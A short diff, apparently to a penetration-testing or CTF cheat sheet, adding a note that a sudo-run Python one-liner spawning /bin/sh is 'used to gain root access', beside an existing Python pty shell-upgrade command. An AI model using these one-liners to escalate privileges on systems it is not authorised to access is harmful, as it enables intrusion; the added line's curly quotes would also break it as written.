@@ -1,1 +1,3 @@
 python -c 'import pty; pty.spawn("/bin/bash")'
+#used to gain root access in some systems.
+sudo python3.5 -c ‘import os; os.system(“/bin/sh”)’
